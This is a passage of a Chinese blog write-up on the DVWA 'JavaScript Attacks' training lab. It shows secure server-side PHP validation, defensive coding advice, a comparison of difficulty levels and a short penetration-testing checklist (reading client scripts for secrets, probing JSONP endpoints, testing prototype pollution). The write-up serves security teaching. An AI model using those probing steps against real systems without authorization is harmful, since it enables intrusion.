class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// api/validate.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Impossible: 所有验证在服务器端 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动Session</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护1：验证CSRF Token ★★★</span></span><br><span class="line"><span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line"><span class="comment">// 防止跨站请求伪造</span></span><br><span class="line"><span class="variable">$csrfToken</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_CSRF_TOKEN&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>], <span class="variable">$csrfToken</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid CSRF token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护2：限流 ★★★</span></span><br><span class="line"><span class="comment">// 防止暴力破解</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">checkRateLimit</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">429</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Too many requests&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取POST数据</span></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证输入</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;phrase&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing phrase&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phrase</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>[<span class="string">&#x27;phrase&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护3：在服务器端存储和验证token ★★★</span></span><br><span class="line"><span class="comment">// 方法1：从数据库读取</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT token FROM challenges WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$expectedToken</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：从配置文件读取</span></span><br><span class="line"><span class="comment">// $expectedToken = getenv(&#x27;CHALLENGE_TOKEN&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：动态生成（基于用户Session）</span></span><br><span class="line"><span class="comment">// $expectedToken = generateTokenForUser($_SESSION[&#x27;user_id&#x27;]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 验证 ★★★</span></span><br><span class="line"><span class="comment">// hash_equals() - 时间安全的字符串比较</span></span><br><span class="line"><span class="comment">// 防止时序攻击</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$expectedToken</span>, <span class="variable">$phrase</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 记录成功的尝试 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">logAttempt</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$phrase</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回成功</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Correct! Well done!&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 记录失败的尝试 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">logAttempt</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>], <span class="variable">$phrase</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回失败（不透露具体原因）</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid phrase&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 辅助函数：限流检查 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRateLimit</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用Redis或数据库实现</span></span><br><span class="line">    <span class="comment">// 例如：每分钟最多5次请求</span></span><br><span class="line">    <span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;rate_limit:<span class="subst">$ip</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$requests</span> = <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">incr</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$requests</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">expire</span>(<span class="variable">$key</span>, <span class="number">60</span>); <span class="comment">// 60秒过期</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$requests</span> &lt;= <span class="number">5</span>; <span class="comment">// 每分钟最多5次</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 辅助函数：记录尝试 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logAttempt</span>(<span class="params"><span class="variable">$userId</span>, <span class="variable">$phrase</span>, <span class="variable">$success</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO attempt_logs (user_id, phrase, success, ip_address, timestamp)</span></span><br><span class="line"><span class="string">         VALUES (?, ?, ?, ?, NOW())&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([</span><br><span class="line">        <span class="variable">$userId</span>,</span><br><span class="line">        <span class="variable">$phrase</span>,</span><br><span class="line">        <span class="variable">$success</span> ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>服务器端验证</strong> - 所有业务逻辑在服务器</li>
+<li><strong>CSRF Protection</strong> - Token验证</li>
+<li><strong>限流机制</strong> - 防止暴力破解</li>
+<li><strong>日志记录</strong> - 记录所有尝试</li>
+<li><strong>时序安全比较</strong> - hash_equals()防时序攻击</li>
+<li><strong>无敏感信息泄露</strong> - 客户端完全不包含秘密</li>
+</ol>
+<p><strong>架构对比：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Low<span class="regexp">/Medium/</span>High (不安全):</span><br><span class="line">用户输入 → JavaScript验证 → 显示结果</span><br><span class="line">         ↑</span><br><span class="line">    包含token、密钥、逻辑</span><br><span class="line"></span><br><span class="line">Impossible (安全):</span><br><span class="line">用户输入 → 发送到服务器 → 服务器验证 → 返回结果 → 显示</span><br><span class="line">                        ↑</span><br><span class="line">                   所有敏感信息和逻辑</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都失败：</strong></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">攻击<span class="number">1</span>：查看源代码</span><br><span class="line">结果：没有任何敏感信息</span><br><span class="line"></span><br><span class="line">攻击<span class="number">2</span>：使用DevTools调试</span><br><span class="line">结果：只能看到UI逻辑，没有业务逻辑</span><br><span class="line"></span><br><span class="line">攻击<span class="number">3</span>：直接调用函数</span><br><span class="line">结果：没有验证函数可调用</span><br><span class="line"></span><br><span class="line">攻击<span class="number">4</span>：修改JavaScript</span><br><span class="line">结果：服务器端验证不受影响</span><br><span class="line"></span><br><span class="line">攻击<span class="number">5</span>：暴力破解</span><br><span class="line">结果：被限流机制阻止</span><br><span class="line"></span><br><span class="line">攻击<span class="number">6</span>：重放攻击</span><br><span class="line">结果：CSRF <span class="built_in">token</span>验证失败</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><h4 id="1-永远不信任客户端"><a href="#1-永远不信任客户端" class="headerlink" title="1. 永远不信任客户端"></a>1. 永远不信任客户端</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❌ 错误模式：</span><br><span class="line">客户端验证 → 通过 → 执行操作</span><br><span class="line"></span><br><span class="line">✅ 正确模式：</span><br><span class="line">客户端验证（仅用于用户体验）</span><br><span class="line">服务器验证 → 通过 → 执行操作</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-敏感数据和逻辑在服务器端"><a href="#2-敏感数据和逻辑在服务器端" class="headerlink" title="2. 敏感数据和逻辑在服务器端"></a>2. 敏感数据和逻辑在服务器端</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 错误：在JavaScript中</span></span><br><span class="line"><span class="keyword">var</span> apiKey = <span class="string">&quot;sk-1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> adminToken = <span class="string">&quot;admin_xyz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 正确：在服务器端</span></span><br><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;api_key&#x27;</span> =&gt; <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;API_KEY&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;admin_token&#x27;</span> =&gt; <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;ADMIN_TOKEN&#x27;</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-实施适当的限流"><a href="#3-实施适当的限流" class="headerlink" title="3. 实施适当的限流"></a>3. 实施适当的限流</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用中间件限流</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RateLimitMiddleware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$next</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&#x27;rate_limit:&#x27;</span> . <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">ip</span>();</span><br><span class="line">        <span class="variable">$limit</span> = <span class="number">10</span>; <span class="comment">// 每分钟10次</span></span><br><span class="line">        <span class="variable">$window</span> = <span class="number">60</span>; <span class="comment">// 60秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Cache</span>::<span class="title function_ invoke__">increment</span>(<span class="variable">$key</span>) &gt; <span class="variable">$limit</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Too many requests&#x27;</span>], <span class="number">429</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">put</span>(<span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$window</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-避免在JavaScript中存储敏感信息"><a href="#1-避免在JavaScript中存储敏感信息" class="headerlink" title="1. 避免在JavaScript中存储敏感信息"></a>1. 避免在JavaScript中存储敏感信息</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 错误</span></span><br><span class="line"><span class="keyword">var</span> password = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> secretKey = <span class="string">&quot;sk_live_12345&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 正确</span></span><br><span class="line"><span class="comment">// 从服务器API获取（需要认证）</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/config&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + sessionToken</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 使用配置，但不永久存储</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-客户端验证仅用于用户体验"><a href="#2-客户端验证仅用于用户体验" class="headerlink" title="2. 客户端验证仅用于用户体验"></a>2. 客户端验证仅用于用户体验</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 客户端验证（提升用户体验）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validateEmail</span>(<span class="params">email</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!email.<span class="title function_">includes</span>(<span class="string">&#x27;@&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;Invalid email format&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 但必须在服务器端再次验证</span></span><br><span class="line"><span class="comment">// PHP后端</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">filter_var</span>($_POST[<span class="string">&#x27;email&#x27;</span>], <span class="variable constant_">FILTER_VALIDATE_EMAIL</span>)) &#123;</span><br><span class="line">    <span class="title function_">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用环境变量存储秘密"><a href="#3-使用环境变量存储秘密" class="headerlink" title="3. 使用环境变量存储秘密"></a>3. 使用环境变量存储秘密</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .env文件</span></span><br><span class="line">API_KEY=sk_live_1234567890</span><br><span class="line">DB_PASSWORD=secure_password_123</span><br><span class="line">JWT_SECRET=random_secret_key</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码中使用</span></span><br><span class="line"><span class="variable">$apiKey</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;API_KEY&#x27;</span>);</span><br><span class="line"><span class="variable">$dbPassword</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-实施内容安全策略（CSP）"><a href="#4-实施内容安全策略（CSP）" class="headerlink" title="4. 实施内容安全策略（CSP）"></a>4. 实施内容安全策略（CSP）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止内联JavaScript执行</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-<span class="subst">&#123;$nonce&#125;</span>&#x27; &#x27;strict-dynamic&#x27;;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><h4 id="1-日志记录"><a href="#1-日志记录" class="headerlink" title="1. 日志记录"></a>1. 日志记录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录所有敏感操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logSecurityEvent</span>(<span class="params"><span class="variable">$event</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;event&#x27;</span> =&gt; <span class="variable">$event</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/security.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-异常检测"><a href="#2-异常检测" class="headerlink" title="2. 异常检测"></a>2. 异常检测</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测异常行为</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAnomalies</span>(<span class="params"><span class="variable">$userId</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 短时间内大量失败尝试</span></span><br><span class="line">    <span class="variable">$failedAttempts</span> = <span class="title function_ invoke__">countFailedAttempts</span>(<span class="variable">$userId</span>, <span class="number">60</span>); <span class="comment">// 过去60秒</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$failedAttempts</span> &gt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;Possible brute force attack on user <span class="subst">$userId</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">lockAccount</span>(<span class="variable">$userId</span>, <span class="number">300</span>); <span class="comment">// 锁定5分钟</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Token存储</td>
+<td>明文JavaScript</td>
+<td>Base64&#x2F;简单混淆</td>
+<td>复杂加密</td>
+<td>服务器端</td>
+</tr>
+<tr>
+<td>验证位置</td>
+<td>客户端</td>
+<td>客户端</td>
+<td>客户端</td>
+<td>服务器端</td>
+</tr>
+<tr>
+<td>敏感信息</td>
+<td>完全暴露</td>
+<td>编码暴露</td>
+<td>加密暴露</td>
+<td>不暴露</td>
+</tr>
+<tr>
+<td>限流</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>CSRF防护</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>日志记录</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试检查清单：</strong></p>
+<ol>
+<li>✅ 查看所有JavaScript文件</li>
+<li>✅ 搜索敏感关键词：token, password, key, secret, admin</li>
+<li>✅ 使用DevTools调试</li>
+<li>✅ 尝试禁用JavaScript</li>
+<li>✅ 检查API请求和响应</li>
+<li>✅ 测试限流机制</li>
+<li>✅ 查找JSONP端点</li>
+<li>✅ 测试原型链污染</li>
+</ol>
+<p><strong>防御检查清单：</strong></p>
+<ol>
+<li>✅ 所有敏感数据在服务器端</li>
+<li>✅ 客户端验证仅用于UX</li>
+<li>✅ 实施服务器端验证</li>
+<li>✅ 使用CSRF Token</li>
+<li>✅ 实施限流机制</li>
+<li>✅ 记录安全事件</li>
+<li>✅ 使用环境变量</li>
+<li>✅ 实施CSP策略</li>
+</ol>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不泄露发现的敏感信息</li>
+<li>学习是为了构建安全的应用</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/JavaScript_Attacks_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - JavaScript Attacks 攻防练习详解">http://caixuya.github.io/2025/11/20/JavaScript_Attacks_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
